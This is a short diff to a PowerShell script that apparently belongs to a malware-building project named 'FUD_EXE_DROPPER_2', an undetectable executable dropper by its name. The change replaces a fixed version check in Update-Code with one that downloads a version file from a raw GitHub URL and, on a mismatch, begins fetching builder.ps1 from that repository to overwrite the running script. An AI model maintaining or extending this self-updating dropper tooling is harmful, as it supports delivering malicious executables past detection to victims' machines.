@@ -15,8 +15,6 @@ if ($image -eq '/?') {
     break
 }
 
-$Version = "1.0"
-
 Add-Type -AssemblyName PresentationFramework
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -Name Window -Namespace Console -MemberDefinition '
@@ -548,7 +546,9 @@ function Update-Code {
         [Parameter(Mandatory=$true)]
         [string]$Version
     )
-    if ($Version -eq "1.0") {
+    $version_info = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KDot227/FUD_EXE_DROPPER_2/main/version.txt" -UseBasicParsing
+    $Version2 = $version_info.Content.Trim()
+    if ($Version -ne $Version2) {
         $repo = "https://raw.githubusercontent.com/KDot227/FUD_EXE_DROPPER_2/main/builder.ps1"
         $path = $PSCommandPath
         $webclient = New-Object System.Net.WebClient
